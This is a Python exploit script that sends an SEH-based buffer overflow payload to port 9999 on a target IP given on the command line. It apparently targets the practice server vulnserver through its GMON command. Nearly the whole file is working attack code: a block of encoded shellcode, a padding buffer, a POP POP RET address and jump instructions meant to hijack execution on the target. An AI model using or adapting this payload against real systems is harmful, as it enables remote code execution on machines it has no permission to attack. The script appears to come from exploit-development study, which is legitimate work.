#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

SHELL =  b""
SHELL += b"\xd9\xea\xba\xf1\xd5\xa1\x70\xd9\x74\x24\xf4\x5e"
SHELL += b"\x31\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x37"
SHELL += b"\xd1\x43\x85\x4b\x32\x01\x66\xb3\xc3\x66\xee\x56"
SHELL += b"\xf2\xa6\x94\x13\xa5\x16\xde\x71\x4a\xdc\xb2\x61"
SHELL += b"\xd9\x90\x1a\x86\x6a\x1e\x7d\xa9\x6b\x33\xbd\xa8"
SHELL += b"\xef\x4e\x92\x0a\xd1\x80\xe7\x4b\x16\xfc\x0a\x19"
SHELL += b"\xcf\x8a\xb9\x8d\x64\xc6\x01\x26\x36\xc6\x01\xdb"
SHELL += b"\x8f\xe9\x20\x4a\x9b\xb3\xe2\x6d\x48\xc8\xaa\x75"
SHELL += b"\x8d\xf5\x65\x0e\x65\x81\x77\xc6\xb7\x6a\xdb\x27"
SHELL += b"\x78\x99\x25\x60\xbf\x42\x50\x98\xc3\xff\x63\x5f"
SHELL += b"\xb9\xdb\xe6\x7b\x19\xaf\x51\xa7\x9b\x7c\x07\x2c"
SHELL += b"\x97\xc9\x43\x6a\xb4\xcc\x80\x01\xc0\x45\x27\xc5"
SHELL += b"\x40\x1d\x0c\xc1\x09\xc5\x2d\x50\xf4\xa8\x52\x82"
SHELL += b"\x57\x14\xf7\xc9\x7a\x41\x8a\x90\x12\xa6\xa7\x2a"
SHELL += b"\xe3\xa0\xb0\x59\xd1\x6f\x6b\xf5\x59\xe7\xb5\x02"
SHELL += b"\x9d\xd2\x02\x9c\x60\xdd\x72\xb5\xa6\x89\x22\xad"
SHELL += b"\x0f\xb2\xa8\x2d\xaf\x67\x7e\x7d\x1f\xd8\x3f\x2d"
SHELL += b"\xdf\x88\xd7\x27\xd0\xf7\xc8\x48\x3a\x90\x63\xb3"
SHELL += b"\xad\x95\x73\xb9\x22\xc2\x71\xbd\x2d\x4e\xff\x5b"
SHELL += b"\x27\x7e\xa9\xf4\xd0\xe7\xf0\x8e\x41\xe7\x2e\xeb"
SHELL += b"\x42\x63\xdd\x0c\x0c\x84\xa8\x1e\xf9\x64\xe7\x7c"
SHELL += b"\xac\x7b\xdd\xe8\x32\xe9\xba\xe8\x3d\x12\x15\xbf"
SHELL += b"\x6a\xe4\x6c\x55\x87\x5f\xc7\x4b\x5a\x39\x20\xcf"
SHELL += b"\x81\xfa\xaf\xce\x44\x46\x94\xc0\x90\x47\x90\xb4"
SHELL += b"\x4c\x1e\x4e\x62\x2b\xc8\x20\xdc\xe5\xa7\xea\x88"
SHELL += b"\x70\x84\x2c\xce\x7c\xc1\xda\x2e\xcc\xbc\x9a\x51"
SHELL += b"\xe1\x28\x2b\x2a\x1f\xc9\xd4\xe1\x9b\xf7\x25\x3b"
SHELL += b"\x36\x6f\x9c\xae\x7b\xed\x1f\x05\xbf\x08\x9c\xaf"
SHELL += b"\x40\xef\xbc\xda\x45\xab\x7a\x37\x34\xa4\xee\x37"
SHELL += b"\xeb\xc5\x3a"

PAYLOAD = (
    b'GMON /.:/' +
    SHELL +
    b'A' * (3571 - 4 - len(SHELL)) +
    # JMP SHORT +0xa
    b'\xeb\x08' +
    # NOP NOP to fill the 4 bytes of nSEH
    b'\x90\x90' +
    # POP R32
    # POP R32
    # RETN
    struct.pack('<L', 0x62501067) +
    b'C' * 2 +
    # JMP long backwards to the start of our 'A' buffer
    b'\xe9\x46\xf2\xff\xff' +
    b'C' * (1445 - 2 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)